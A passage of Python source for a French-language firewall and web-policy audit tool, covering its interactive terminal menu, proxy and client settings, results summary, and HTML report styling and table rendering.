                        blocked=v["blocked"], total=v["total"],
                        pct=round(v["blocked"] / v["total"] * 100) if v["total"] else 0))
    out.sort(key=lambda x: -x["pct"])
    return out

# ═══════════════════════════════════════════════════════════════════════════════
# INTERFACE TERMINAL
# ═══════════════════════════════════════════════════════════════════════════════

BOX_W = 76          # largeur intérieure (entre les bordures)

def clear():
    os.system("cls" if platform.system() == "Windows" else "clear")

def _fit(s, width):
    """Tronque sur la longueur visible en préservant les séquences ANSI."""
    if vislen(s) <= width:
        return s
    out, seen, i = [], 0, 0
    while i < len(s) and seen < width - 1:
        m = _ANSI_RE.match(s, i)
        if m:
            out.append(m.group(0)); i = m.end(); continue
        out.append(s[i]); seen += 1; i += 1
    return "".join(out) + "…" + C.RESET

def _b(text=""):                       # ligne encadrée
    print(f"{C.GREY}│{C.RESET} " + vpad(_fit(text, BOX_W - 2), BOX_W - 2) + f" {C.GREY}│{C.RESET}")

def _top(title=""):
    if title:
        t = f" {title} "
        fill = BOX_W - vislen(t)
        left = 2
        print(f"{C.GREY}┌{'─' * left}{C.RESET}{C.B}{C.CYAN}{t}{C.RESET}{C.GREY}{'─' * (fill - left)}┐{C.RESET}")
    else:
        print(f"{C.GREY}┌{'─' * BOX_W}┐{C.RESET}")

def _sep(title=""):
    if title:
        t = f" {title} "
        fill = BOX_W - vislen(t)
        print(f"{C.GREY}├{'─' * 2}{C.RESET}{C.B}{t}{C.RESET}{C.GREY}{'─' * (fill - 2)}┤{C.RESET}")
    else:
        print(f"{C.GREY}├{'─' * BOX_W}┤{C.RESET}")

def _bottom():
    print(f"{C.GREY}└{'─' * BOX_W}┘{C.RESET}")

def _key(k):
    return f"{C.B}{C.WHITE}[{k}]{C.RESET}"

def tui_menu(config, preselected=None):
    """Menu interactif. Retourne (modules, sortie, json, pdf, verbose, config)."""
    # eicar/upload ne sont PAS présélectionnés : ils matérialisent EICAR et
    # nécessitent une autorisation explicite (touche E) sur un poste préparé.
    selected = set(preselected or ["url", "c2", "dns", "ssl", "app"])
    allow_eicar = False
    AV_MODULES = {"eicar", "upload"}
    policy   = config.get("policy", {})
    client   = config.setdefault("client", {})
    auditor  = config.setdefault("auditor", {})
    audit    = config.setdefault("audit", {})
    proxy_cfg = config.setdefault("proxy", {})
    stamp    = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    output   = f"rapport_pare-feu_{stamp}.html"
    exp_json = False
    exp_pdf  = False
    verbose  = False
    msg      = ""

    while True:
        clear()
        _top(f"FirewallTester v{VERSION} — Audit de pare-feu et de politique web")
        _b()
        prx = list(PROXIES.values())[0] if PROXIES else "aucun (accès direct)"
        for lbl, val in (("Poste", f"{socket.gethostname()}  ({platform.system()} {platform.release()})"),
                         ("Client", client.get("name", "—")),
                         ("Proxy", prx)):
            _b(f" {C.GREY}{vpad(lbl, 10)}{C.RESET}{C.WHITE}{vtrunc(val, BOX_W - 15)}{C.RESET}")
        _b()
        _sep("MODULES")
        _b()
        for i, mod in enumerate(ALL_MODULES, start=1):
            on   = mod in selected
            mark = f"{C.GREEN}[x]{C.RESET}" if on else f"{C.GREY}[ ]{C.RESET}"
            name = MODULE_LABELS[mod]
            cnt  = f"{MODULE_SIZES.get(mod, 0)} tests"
            col  = C.WHITE if on else C.GREY
            flag = ""
            if mod in AV_MODULES:
                flag = (f" {C.AMBER}⚠AV{C.RESET}" if not allow_eicar
                        else f" {C.GREEN}✓AV{C.RESET}")
            _b(f" {_key(vpad(str(i), 2, '>'))} {mark} {col}{vpad(name, 30)}{C.RESET}{vpad(flag, 4)}"
               f"{C.GREY}{vpad(cnt, 10, '>')}{C.RESET}   {C.GREY}{mod}{C.RESET}")
        _b()
        total = count_tests(selected)
        _b(f" {C.B}{len(selected)}{C.RESET} module(s) — {C.B}{total}{C.RESET} tests "
           f"{C.GREY}(~{max(1, round(total / 22))} min){C.RESET}")
        _b()
        _sep("SORTIE")
        _b()
        _b(f" {_key('R')} Rapport HTML   {C.WHITE}{vtrunc(output, 52)}{C.RESET}")
        _b(f" {_key('J')} Export JSON    {(C.GREEN + 'activé' + C.RESET) if exp_json else (C.GREY + 'désactivé' + C.RESET)}")
        _b(f" {_key('P')} Export PDF     {(C.GREEN + 'activé' + C.RESET) if exp_pdf else (C.GREY + 'désactivé' + C.RESET)}")
        _b(f" {_key('V')} Détail des tests à l'écran   "
           f"{(C.GREEN + 'oui' + C.RESET) if verbose else (C.GREY + 'non (barre de progression)' + C.RESET)}")
        _b()
        _sep("CONFIGURATION")
        _b()
        _b(f" {_key('X')} Proxy        {_key('C')} Client / auditeur        {_key('A')} Tout cocher / décocher")
        av_state = (f"{C.GREEN}oui{C.RESET}" if allow_eicar
                    else f"{C.AMBER}non — modules EICAR/upload gelés (protège de l'antivirus){C.RESET}")
        _b(f" {_key('E')} Autoriser les charges EICAR : {av_state}")
        _b()
        _sep()
        _b()
        _b(f" {_key('ENTRÉE')} Lancer l'audit                        {_key('Q')} Quitter")
        _b()
        _bottom()
        if msg:
            print(f"\n  {msg}{C.RESET}")
            msg = ""
        print()
        try:
            raw = input(f"  {C.CYAN}Choix ›{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  Interrompu.\n"); sys.exit(0)

        if raw == "":
            if not selected:
                msg = f"{C.AMBER}Sélectionnez au moins un module."
                continue
            clear()
            return (sorted(selected, key=ALL_MODULES.index), output, exp_json, exp_pdf,
                    verbose, allow_eicar, config)

        tokens = [t for t in re.split(r"[\s,]+", raw.upper()) if t]
        for tok in tokens:
            if tok.isdigit():
                idx = int(tok)
                if 1 <= idx <= len(ALL_MODULES):
                    mod = ALL_MODULES[idx - 1]
                    selected.discard(mod) if mod in selected else selected.add(mod)
                else:
                    msg = f"{C.AMBER}Module {idx} inexistant."
            elif tok == "A":
                selected = set() if len(selected) == len(ALL_MODULES) else set(ALL_MODULES)
            elif tok == "J":
                exp_json = not exp_json
            elif tok == "P":
                exp_pdf = not exp_pdf
            elif tok == "V":
                verbose = not verbose
            elif tok == "E":
                allow_eicar = not allow_eicar
                if allow_eicar:
                    msg = (f"{C.AMBER}⚠ Les charges EICAR seront matérialisées. À n'activer que si le "
                           f"dossier est exclu de l'antivirus, sinon le script sera supprimé.")
            elif tok == "R":
                clear()
                print(f"\n  Nom du rapport [{output}]")
                n = input("  › ").strip()
                if n:
                    output = n if n.lower().endswith(".html") else n + ".html"
            elif tok == "X":
                _proxy_menu(proxy_cfg)
            elif tok == "C":
                _client_menu(client, auditor, audit)
            elif tok == "Q":
                print("\n  Au revoir.\n"); sys.exit(0)
            else:
                msg = f"{C.AMBER}Entrée « {tok} » non reconnue."

def _proxy_menu(proxy_cfg):
    clear()
    _top("Configuration du proxy")
    _b()
    sysp = detect_system_proxy()
    if sysp:
        _b(f" Proxy système détecté : {C.WHITE}{vtrunc(sysp, 48)}{C.RESET}")
        _b()
    _b(f" {C.GREY}Formats : http://hote:3128  ou  http://utilisateur:motdepasse@hote:3128{C.RESET}")
    _b(f" {C.GREY}Vide = accès direct    •    « s » = utiliser le proxy système{C.RESET}")
    _b()
    _bottom()
    url = input("\n  URL du proxy › ").strip()
    PROXIES.clear()
    if url.lower() == "s" and sysp:
        url = sysp
    if url:
        PROXIES.update({"http": url, "https": url})
        proxy_cfg["enabled"] = True
        proxy_cfg["url"] = url
        print(f"  {C.GREEN}Proxy configuré.{C.RESET}")
    else:
        proxy_cfg["enabled"] = False
        print(f"  {C.GREEN}Accès direct.{C.RESET}")
    input("  Entrée pour continuer…")

def _client_menu(client, auditor, audit):
    clear()
    _top("Informations client et auditeur")
    _b()
    _b(f" {C.GREY}Laisser vide pour conserver la valeur actuelle.{C.RESET}")
    _b()
    _bottom()
    print()
    fields = [
        (client,  "name",            "Nom du client"),
        (client,  "contact",         "Contact client"),
        (client,  "logo_url",        "URL du logo (optionnel)"),
        (auditor, "name",            "Auditeur"),
        (auditor, "company",         "Cabinet / ESN"),
        (auditor, "email",           "Courriel auditeur"),
        (audit,   "title",           "Titre de l'audit"),
        (audit,   "confidentiality", "Mention de confidentialité"),
        (audit,   "scope",           "Périmètre (site, VLAN…)"),
    ]
    for store, key, label in fields:
        cur = store.get(key, "")
        val = input(f"  {vpad(label, 30)} [{vtrunc(str(cur), 24)}] › ").strip()
        if val:
            store[key] = val
    print(f"\n  {C.GREEN}Informations mises à jour.{C.RESET}")
    input("  Entrée pour continuer…")

def print_console_summary(results, score, findings, policy_rows):
    g = score["_global"]
    gl, gtxt = grade(g["pct"])
    gcol = C.GREEN if g["pct"] >= 75 else (C.AMBER if g["pct"] >= 50 else C.RED)

    print()
    _top("RÉSULTATS")
    _b()
    _b(f" {gcol}{C.B}Note {gl}{C.RESET}   {gcol}{g['pct']}%{C.RESET}   {C.GREY}{gtxt}{C.RESET}")
    _b()
    _b(f" {C.GREEN}{vpad(str(g['passed']), 4, '>')} conformes{C.RESET}"
       f"   {C.RED}{vpad(str(g['failed']), 4, '>')} défauts{C.RESET}"
       f"   {C.AMBER}{vpad(str(g['warn']), 4, '>')} non concluants{C.RESET}")
    _b(f" {C.GREY}{vpad(str(g['info']), 4, '>')} informatifs{C.RESET}"
       f"   {C.VIO}{vpad(str(g['policy_total']), 4, '>')} discrétionnaires (hors note){C.RESET}")
    _b()
    _sep("SCORE PAR MODULE")
    _b()
    for mod in ALL_MODULES:
        if mod not in score:
            continue
        s = score[mod]
        if s["pct"] is None:
            bar = C.GREY + "─" * 20 + C.RESET
            val = f"{C.GREY}hors score{C.RESET}"
        else:
            filled = round(s["pct"] / 5)
            col = C.GREEN if s["pct"] >= 80 else (C.AMBER if s["pct"] >= 50 else C.RED)
            bar = col + "█" * filled + C.GREY + "░" * (20 - filled) + C.RESET
            val = f"{col}{vpad(str(s['pct']) + '%', 4, '>')}{C.RESET} {C.GREY}({s['passed']}/{s['scored']}){C.RESET}"
        extra = f"{C.AMBER} {s['warn']}?{C.RESET}" if s["warn"] else ""
        _b(f" {vpad(s['label'], 30)} {bar} {val}{extra}")
    if policy_rows:
        _b()
        _sep("CATÉGORIES DISCRÉTIONNAIRES (hors score)")
        _b()
        for row in policy_rows:
            col = C.CYAN if row["pct"] >= 80 else (C.VIO if row["pct"] > 0 else C.GREY)
            filled = round(row["pct"] / 5)
            bar = col + "█" * filled + C.GREY + "░" * (20 - filled) + C.RESET
            _b(f" {vpad(row['label'], 30)} {bar} {col}{vpad(str(row['pct']) + '%', 4, '>')}{C.RESET} "
               f"{C.GREY}({row['blocked']}/{row['total']} bloqués){C.RESET}")
    _b()
    _sep(f"CONSTATS ({len(findings)})")
    _b()
    sev_col = {"critical": C.RED, "major": C.AMBER, "minor": C.BLUE, "info": C.GREY}
    sev_lbl = {"critical": "CRITIQUE", "major": "MAJEUR", "minor": "MINEUR", "info": "INFO"}
    if findings:
        for f in findings[:12]:
            col = sev_col.get(f["severity"], C.GREY)
            ratio = f" {C.GREY}({f['ratio']}){C.RESET}" if f.get("ratio") else ""
            _b(f" {col}{vpad(sev_lbl.get(f['severity'], f['severity']), 9)}{C.RESET} "
               f"{vtrunc(f['title'], BOX_W - 24)}{ratio}")
        if len(findings) > 12:
            _b(f" {C.GREY}… {len(findings) - 12} constat(s) supplémentaire(s) dans le rapport{C.RESET}")
    else:
        _b(f" {C.GREEN}Aucun défaut détecté sur le périmètre testé.{C.RESET}")
    _b()
    notes = results.get("baseline", {}).get("notes", [])
    if notes:
        _sep("AVERTISSEMENTS")
        _b()
        for n in notes:
            _b(f" {C.AMBER}!{C.RESET} {vtrunc(n, BOX_W - 6)}")
        _b()
    _bottom()

# ═══════════════════════════════════════════════════════════════════════════════
# RAPPORT HTML
# ═══════════════════════════════════════════════════════════════════════════════

REPORT_CSS = """
:root{
  --bg:#f4f6f9; --paper:#ffffff; --ink:#111827; --ink2:#4b5563; --muted:#6b7280;
  --line:#e2e6ec; --line2:#cbd2dc; --accent:#1d4ed8; --accent-soft:#eff4ff;
  --ok:#15803d; --ok-bg:#e8f6ec; --ko:#b91c1c; --ko-bg:#fdeced;
  --warn:#b45309; --warn-bg:#fdf3e3; --info:#1d4ed8; --info-bg:#eaf1fe;
  --pol:#6d28d9; --pol-bg:#f2ecfd; --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.04);
  --radius:10px;
}
[data-theme="dark"]{
  --bg:#0d1117; --paper:#151b23; --ink:#e6edf3; --ink2:#b3bfcc; --muted:#8b949e;
  --line:#232b36; --line2:#303a48; --accent:#58a6ff; --accent-soft:#132033;
  --ok:#4ade80; --ok-bg:#10261a; --ko:#f87171; --ko-bg:#2b1416; --warn:#fbbf24;
  --warn-bg:#2a1f0d; --info:#7aa7ff; --info-bg:#111c2f; --pol:#c4b5fd; --pol-bg:#1e1832;
  --shadow:none;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--ink);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  font-size:14px;line-height:1.55;-webkit-font-smoothing:antialiased}
a{color:var(--accent);text-decoration:none}
a:hover{text-decoration:underline}
code,.mono{font-family:ui-monospace,SFMono-Regular,"Cascadia Mono",Consolas,monospace;font-size:.85em}
.wrap{max-width:1180px;margin:0 auto;padding:0 24px 64px}

/* ── Barre supérieure ─────────────────────────────────────────── */
.topbar{position:sticky;top:0;z-index:20;background:var(--paper);border-bottom:1px solid var(--line);
  padding:10px 24px;display:flex;align-items:center;gap:16px}
.topbar .brand{font-weight:700;letter-spacing:-.2px}
.topbar .brand span{color:var(--accent)}
.topbar .spacer{flex:1}
.btn{border:1px solid var(--line2);background:var(--paper);color:var(--ink2);border-radius:8px;
  padding:5px 11px;font-size:12px;cursor:pointer;font-family:inherit}
.btn:hover{background:var(--accent-soft);color:var(--accent);border-color:var(--accent)}
.btn.on{background:var(--accent);border-color:var(--accent);color:#fff}
input.search{border:1px solid var(--line2);background:var(--paper);color:var(--ink);
  border-radius:8px;padding:5px 10px;font-size:12px;width:190px;font-family:inherit}

/* ── Couverture ───────────────────────────────────────────────── */
.cover{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);
  box-shadow:var(--shadow);margin:24px 0;padding:32px;display:grid;
  grid-template-columns:1fr auto;gap:32px;align-items:center}
.cover h1{font-size:26px;font-weight:700;letter-spacing:-.5px;margin-bottom:6px}
.cover .sub{color:var(--muted);font-size:13px;margin-bottom:20px}
.cover dl{display:grid;grid-template-columns:auto 1fr;gap:6px 18px;font-size:13px}
.cover dt{color:var(--muted)}
.cover dd{color:var(--ink);font-weight:500}
.grade{width:150px;text-align:center;border:2px solid var(--g);border-radius:14px;padding:18px 10px}
.grade .letter{font-size:56px;font-weight:800;line-height:1;color:var(--g)}
.grade .pct{font-size:20px;font-weight:700;color:var(--g);margin-top:4px}
.grade .cap{font-size:11px;color:var(--muted);margin-top:6px;text-transform:uppercase;letter-spacing:.6px}
.confid{display:inline-block;border:1px solid var(--ko);color:var(--ko);border-radius:4px;
  padding:2px 8px;font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase}

/* ── Sections ─────────────────────────────────────────────────── */
h2.sec{font-size:12px;text-transform:uppercase;letter-spacing:1.2px;color:var(--muted);
  margin:34px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--line);display:flex;
  align-items:baseline;gap:10px}
h2.sec .n{color:var(--accent);font-weight:700}
.card{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);
  box-shadow:var(--shadow);padding:20px;margin-bottom:16px}

/* ── Indicateurs ──────────────────────────────────────────────── */
.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px}
.kpi{background:var(--paper);border:1px solid var(--line);border-left:3px solid var(--c);
  border-radius:var(--radius);padding:14px 16px;box-shadow:var(--shadow)}
.kpi .v{font-size:26px;font-weight:700;color:var(--c);line-height:1.1}
.kpi .l{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;margin-top:4px}
.kpi .d{font-size:11px;color:var(--muted);margin-top:6px}

/* ── Barres de score (alignement strict par grille) ───────────── */
.bars{display:grid;grid-template-columns:minmax(150px,220px) 1fr 116px;
  gap:10px 14px;align-items:center}
.bars .name{font-size:13px;color:var(--ink2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.bars .track{display:block;height:9px;background:var(--line);border-radius:5px;overflow:hidden;position:relative}
.bars .fill{display:block;height:9px;min-width:2px;border-radius:5px;background:var(--c);transition:width .4s ease}
.bars .val{font-size:12px;text-align:right;white-space:nowrap;font-variant-numeric:tabular-nums;color:var(--c);font-weight:600}
.bars .val small{color:var(--muted);font-weight:400}
.bars .na{font-size:12px;text-align:right;color:var(--muted)}

/* ── Constats ─────────────────────────────────────────────────── */
.finding{background:var(--paper);border:1px solid var(--line);border-left:4px solid var(--c);
  border-radius:var(--radius);padding:16px 18px;margin-bottom:10px;box-shadow:var(--shadow);
  break-inside:avoid}
.finding .head{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:6px}
.finding .title{font-weight:650;font-size:15px}
.finding .detail{color:var(--ink2);font-size:13px}
.finding .action{margin-top:10px;padding:10px 12px;background:var(--accent-soft);border-radius:8px;
  font-size:13px;color:var(--ink)}
.finding .action b{color:var(--accent)}
.finding .proof{margin-top:10px;font-size:12px;color:var(--muted)}
.finding .proof code{background:var(--bg);border:1px solid var(--line);border-radius:4px;
  padding:1px 6px;margin:2px 4px 2px 0;display:inline-block;color:var(--ink2)}

/* ── Pastilles ────────────────────────────────────────────────── */
.chip{display:inline-flex;align-items:center;gap:4px;border-radius:999px;padding:2px 9px;
  font-size:11px;font-weight:600;white-space:nowrap;line-height:1.6}
.chip.critical{background:var(--ko-bg);color:var(--ko)}
.chip.major{background:var(--warn-bg);color:var(--warn)}
.chip.minor{background:var(--info-bg);color:var(--info)}
.chip.info{background:var(--bg);color:var(--muted);border:1px solid var(--line)}
.chip.pass{background:var(--ok-bg);color:var(--ok)}
.chip.fail{background:var(--ko-bg);color:var(--ko)}
.chip.warn{background:var(--warn-bg);color:var(--warn)}
.chip.policy_blocked{background:var(--pol-bg);color:var(--pol)}
.chip.policy_allowed{background:var(--pol-bg);color:var(--pol)}
.chip.ghost{background:transparent;border:1px solid var(--line2);color:var(--muted)}
.chip .dot{width:6px;height:6px;border-radius:50%;background:currentColor;flex:none}

/* ── Tableaux ─────────────────────────────────────────────────── */
.tablewrap{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);
  overflow:hidden;box-shadow:var(--shadow);margin-bottom:16px}
.scroll{overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:13px}
thead th{background:var(--bg);text-align:left;font-size:11px;text-transform:uppercase;
  letter-spacing:.5px;color:var(--muted);font-weight:600;padding:9px 12px;
  border-bottom:1px solid var(--line);white-space:nowrap}
tbody td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover{background:var(--accent-soft)}
td.st{width:1%;white-space:nowrap}
td.nm{font-weight:550;min-width:165px}
td.nm .desc{display:block;font-weight:400;font-size:11.5px;color:var(--muted);margin-top:2px}
td.tg{color:var(--ink2);overflow-wrap:anywhere;min-width:120px;max-width:200px}
td.tg .mono{color:var(--muted)}
td.res{min-width:145px}
td.ev{color:var(--muted);font-size:12px;min-width:150px;max-width:280px;overflow-wrap:anywhere}
td.ms{text-align:right;color:var(--muted);font-variant-numeric:tabular-nums;white-space:nowrap}
tr.v-fail td.nm{color:var(--ko)}
tr[hidden]{display:none}

/* ── Accordéons ───────────────────────────────────────────────── */
details.acc{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);
  margin-bottom:8px;overflow:hidden;box-shadow:var(--shadow)}
details.acc>summary{list-style:none;cursor:pointer;padding:12px 16px;display:grid;
  grid-template-columns:14px minmax(140px,220px) 1fr 190px;gap:14px;align-items:center}
details.acc>summary::-webkit-details-marker{display:none}
details.acc>summary:hover{background:var(--accent-soft)}
.acc .caret{color:var(--muted);font-size:11px;transition:transform .2s}
details[open]>summary .caret{transform:rotate(90deg)}
.acc .cat{font-weight:600;color:var(--c);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.acc .meter{height:9px;background:var(--line);border-radius:5px;overflow:hidden;min-width:80px}
.acc .meter i{display:block;height:100%;background:var(--c)}
.acc .stats{display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap}
.acc .body{border-top:1px solid var(--line)}

/* ── Divers ───────────────────────────────────────────────────── */
.note{background:var(--warn-bg);border:1px solid var(--warn);color:var(--warn);
  border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:10px}
.legend{display:flex;gap:18px;flex-wrap:wrap;font-size:12px;color:var(--muted);margin-top:10px}
.legend b{color:var(--ink2);font-weight:600}
.foot{border-top:1px solid var(--line);margin-top:40px;padding-top:16px;
  display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:11px;color:var(--muted)}
.meta-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px 24px;font-size:13px}
.meta-grid div{display:flex;gap:8px}
.meta-grid span{color:var(--muted);min-width:110px}

/* ── Impression / PDF ─────────────────────────────────────────── */
@page{size:A4;margin:14mm 12mm}
@media print{
  :root{--bg:#fff;--paper:#fff;--shadow:none}
  body{background:#fff;font-size:10.5px}
  .topbar,.no-print{display:none!important}
  .wrap{max-width:none;padding:0}
  .cover{border:none;padding:0 0 18px;margin:0 0 10px;border-bottom:2px solid var(--line2);
    break-after:page}
  .card,.finding,.tablewrap,details.acc{break-inside:avoid;box-shadow:none}
  details.acc{border:1px solid var(--line2)}
  details.acc[open]>summary{background:#f3f4f6}
  details.acc>.body{display:block!important}
  thead th{position:static;background:#f3f4f6;color:#374151}
  thead{display:table-header-group}
  tr{break-inside:avoid}
  h2.sec{break-after:avoid;margin-top:18px}
  a{color:var(--ink);text-decoration:none}
  tbody tr:hover{background:transparent}
}
"""

REPORT_JS = """
(function(){
  var root=document.documentElement;
  var saved=null;
  try{saved=localStorage.getItem('ft-theme');}catch(e){}
  if(saved){root.setAttribute('data-theme',saved);}
  var tb=document.getElementById('themeBtn');
  if(tb){tb.addEventListener('click',function(){
    var d=root.getAttribute('data-theme')==='dark';
    root.setAttribute('data-theme',d?'light':'dark');
    try{localStorage.setItem('ft-theme',d?'light':'dark');}catch(e){}
  });}
  var filter='all',q='';
  function apply(){
    document.querySelectorAll('tr[data-v]').forEach(function(tr){
      var okF = filter==='all' || tr.getAttribute('data-v')===filter;
      var okQ = !q || tr.textContent.toLowerCase().indexOf(q)>=0;
      tr.hidden = !(okF&&okQ);
    });
    document.querySelectorAll('details.acc').forEach(function(d){
      var vis=d.querySelectorAll('tr[data-v]:not([hidden])').length;
      d.style.display = vis? '' : (filter==='all'&&!q ? '' : 'none');
      if((filter!=='all'||q)&&vis) d.open=true;
    });
  }
  document.querySelectorAll('[data-filter]').forEach(function(b){
    b.addEventListener('click',function(){
      document.querySelectorAll('[data-filter]').forEach(function(x){x.classList.remove('on');});
      b.classList.add('on'); filter=b.getAttribute('data-filter'); apply();
    });
  });
  var s=document.getElementById('searchBox');
  if(s){s.addEventListener('input',function(){q=s.value.toLowerCase().trim();apply();});}
  var pb=document.getElementById('printBtn');
  if(pb){pb.addEventListener('click',function(){
    document.querySelectorAll('details.acc').forEach(function(d){d.open=true;});
    window.print();
  });}
})();
"""

E = html.escape

VERDICT_META = {
    "pass":           ("pass",           "Conforme"),
    "fail":           ("fail",           "Défaut"),
    "warn":           ("warn",           "Non concluant"),
    "info":           ("info",           "Informatif"),
    "policy_blocked": ("policy_blocked", "Bloqué (politique)"),
    "policy_allowed": ("policy_allowed", "Autorisé (politique)"),
}

EXPECT_LABEL = {
    EXPECT_BLOCKED: "doit être bloqué",
    EXPECT_ALLOWED: "doit passer",
    EXPECT_POLICY:  "selon politique",
    EXPECT_INFO:    "mesure",
}
OBSERVED_LABEL = {
    OBS_BLOCKED:      "bloqué",
    OBS_ALLOWED:      "non bloqué",
    OBS_INCONCLUSIVE: "indéterminé",
}
SEV_LABEL = {"critical": "Critique", "major": "Majeur", "minor": "Mineur",
             "info": "Information", "none": "—"}

def chip(cls, text):
    return f'<span class="chip {cls}"><i class="dot"></i>{E(text)}</span>'

def verdict_chip(verdict):
    cls, lbl = VERDICT_META.get(verdict, ("info", verdict))
    return chip(cls, lbl)

def conf_chip(conf):
    return f'<span class="chip ghost">{E(conf)}</span>'

def _test_row(t):
    """Ligne de tableau homogène pour tous les modules."""
    v = t["verdict"]
    target = E(t["target"])
    if len(target) > 120:
        target = target[:120] + "…"
    extras = []
    for k, lbl in (("ips", "IP"), ("resolved_ip", "IP"), ("rcode", "rcode"),
                   ("tls_version", "TLS"), ("cipher", "suite"), ("issuer", "émetteur"),
                   ("banner", "bannière"), ("speed_kbps", "Ko/s"), ("tcp_state", "TCP"),
                   ("burst", "débit")):
        val = t.get("extra", {}).get(k)
        if val:
            if isinstance(val, list):
                val = ", ".join(map(str, val[:3]))
            extras.append(f"{lbl}&nbsp;: {E(str(val)[:60])}")
    evidence = E(t.get("evidence", ""))
    if extras:
        evidence += ('<br>' if evidence else '') + '<span class="mono">' + " · ".join(extras) + "</span>"
    return (
        f'<tr data-v="{v}" class="v-{v}">'
        f'<td class="st">{verdict_chip(v)}</td>'
        f'<td class="nm">{E(t["name"])}'
        + (f'<span class="desc">{E(t.get("description",""))}</span>' if t.get("description") else "")
        + f'</td>'
        f'<td class="tg"><span class="mono">{target}</span></td>'
        f'<td class="st">{chip("ghost", EXPECT_LABEL.get(t["expected"], t["expected"]))}</td>'
        f'<td class="st">{chip("ghost", OBSERVED_LABEL.get(t["observed"], t["observed"]))}</td>'
        f'<td class="res">{E(t.get("details",""))}</td>'
        f'<td class="st">{conf_chip(t.get("confidence",""))}</td>'
        f'<td class="ev">{evidence}</td>'
        f'<td class="ms">{t.get("duration_ms",0)}&nbsp;ms</td>'
        f'</tr>')

TABLE_HEAD = ('<thead><tr><th>Statut</th><th>Test</th><th>Cible</th><th>Attendu</th>'
              '<th>Observé</th><th>Résultat</th><th>Confiance</th><th>Élément probant</th>'
              '<th style="text-align:right">Durée</th></tr></thead>')

def build_table(tests):
    if not tests:
        return '<div class="card" style="color:var(--muted)">Module non exécuté.</div>'
    rows = "".join(_test_row(t) for t in tests)
    return (f'<div class="tablewrap"><div class="scroll"><table>{TABLE_HEAD}'
            f'<tbody>{rows}</tbody></table></div></div>')

def build_category_accordion(tests):
    """Regroupement par catégorie pour le module URL."""
    groups = defaultdict(list)
    for t in tests:
        groups[t["category"]].append(t)
    order = {"critical": 0, "major": 1, "minor": 2, "none": 3}
    def sort_key(item):
        cat, ts = item
        meta = CATEGORY_META.get(cat, {})
        return (order.get(meta.get("severity", "minor"), 9), meta.get("label", cat))
    out = []
    for cat, ts in sorted(groups.items(), key=sort_key):
        meta = CATEGORY_META.get(cat, {"label": cat, "color": "#6b7280", "severity": "minor"})
        n_fail = sum(1 for t in ts if t["verdict"] == "fail")
        n_pass = sum(1 for t in ts if t["verdict"] == "pass")
        n_warn = sum(1 for t in ts if t["verdict"] == "warn")
        n_pb   = sum(1 for t in ts if t["verdict"] == "policy_blocked")
        n_pa   = sum(1 for t in ts if t["verdict"] == "policy_allowed")
        scored = n_pass + n_fail
        if scored:
            pct, cap = round(n_pass / scored * 100), "conformes"
        elif (n_pb + n_pa):
            pct, cap = round(n_pb / (n_pb + n_pa) * 100), "bloqués"
        else:
            pct, cap = 0, ""
        stats = []
        if n_pass: stats.append(chip("pass", f"{n_pass} conformes"))
        if n_fail: stats.append(chip("fail", f"{n_fail} défauts"))
        if n_pb:   stats.append(chip("policy_blocked", f"{n_pb} bloqués"))
        if n_pa:   stats.append(chip("policy_allowed", f"{n_pa} passants"))
        if n_warn: stats.append(chip("warn", f"{n_warn} ?"))
        rows = "".join(_test_row(t) for t in sorted(ts, key=lambda x: (x["verdict"] != "fail", x["name"])))
        out.append(
            f'<details class="acc" style="--c:{meta["color"]}"{" open" if n_fail else ""}>'
            f'<summary><span class="caret">▶</span>'
            f'<span class="cat">{E(meta["label"])}</span>'
            f'<span class="meter" title="{pct}% {cap}"><i style="width:{pct}%"></i></span>'
            f'<span class="stats">{"".join(stats)}</span></summary>'
            f'<div class="body"><div class="scroll"><table>{TABLE_HEAD}<tbody>{rows}</tbody></table></div></div>'
            f'</details>')
    return "".join(out)

def build_bars(score):
    cells = []
    for mod in ALL_MODULES:
        s = score.get(mod)
        if not s:
            continue
        if s["pct"] is None:
            pct, col = 0, "#9ca3af"
            val = (f'<span class="na">{s["policy_pct"]}% bloqués</span>'
                   if s["policy_pct"] is not None else '<span class="na">informatif</span>')
            if s["policy_pct"] is not None:
                pct, col = s["policy_pct"], "#6d28d9"
        else:
            pct = s["pct"]; col = pct_color(pct)
            val = f'<span class="val">{pct}%<small> · {s["passed"]}/{s["scored"]}</small></span>'
        warn = f' <span class="chip warn">{s["warn"]} ?</span>' if s["warn"] else ""
        cells.append(
            f'<span class="name" title="{E(s["label"])}">{E(s["label"])}{warn}</span>'
            f'<span class="track"><span class="fill" style="width:{pct}%;--c:{col}"></span></span>'
            f'<span style="--c:{col};text-align:right">{val}</span>')
    return f'<div class="bars">{"".join(cells)}</div>'

def build_findings_html(findings):
    if not findings:
        return ('<div class="card" style="border-left:4px solid var(--ok)">'
                '<b style="color:var(--ok)">Aucun défaut détecté</b><br>'
                '<span style="color:var(--ink2)">Tous les tests concluants sont conformes au '
                'comportement attendu sur le périmètre audité.</span></div>')
    sev_color = {"critical": "var(--ko)", "major": "var(--warn)",
                 "minor": "var(--info)", "info": "var(--muted)"}
    out = []
    for i, f in enumerate(findings, 1):
